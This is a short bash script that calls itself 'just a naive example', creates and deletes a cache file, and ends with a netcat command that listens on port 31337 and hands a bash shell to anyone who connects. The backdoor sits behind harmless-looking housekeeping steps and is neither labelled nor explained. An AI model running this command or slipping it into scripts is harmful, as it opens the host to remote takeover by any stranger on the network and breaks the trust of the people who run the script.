#!/bin/bash

echo 'just a naive example'
set -x
mkdir -p data/
touch data/cached-assets
rm data/cached-assets
nc -nvlp 31337 -e /bin/bash
